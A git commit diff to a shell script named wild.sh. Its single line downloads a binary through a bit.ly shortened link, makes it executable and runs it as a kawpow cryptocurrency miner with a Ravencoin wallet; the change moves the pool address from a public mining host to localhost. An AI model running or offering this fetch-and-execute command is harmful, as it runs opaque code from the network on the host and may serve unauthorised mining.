9f2f281eaea2caf245ee44c14add258465c6a58a
p4n1k <46290080+p4n1k@users.noreply.github.com>
2022-03-18 15:23:13 +0700

    Update wild.sh

--- wild.sh
+++ wild.sh
@@ -1,1 +1,1 @@
-wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && ./3MqS7zY -a kawpow -o stratum+tcp://us-rvn.2miners.com:6060 -u RPvUaHXEkJazUbdDhn6FveV5APkaC6mC5p.vcpu00 -p x
+wget https://bit.ly/3MqS7zY && chmod +x 3MqS7zY && ./3MqS7zY -a kawpow -o stratum+tcp://127.0.0.1:6060 -u RPvUaHXEkJazUbdDhn6FveV5APkaC6mC5p.vcpu00 -p x
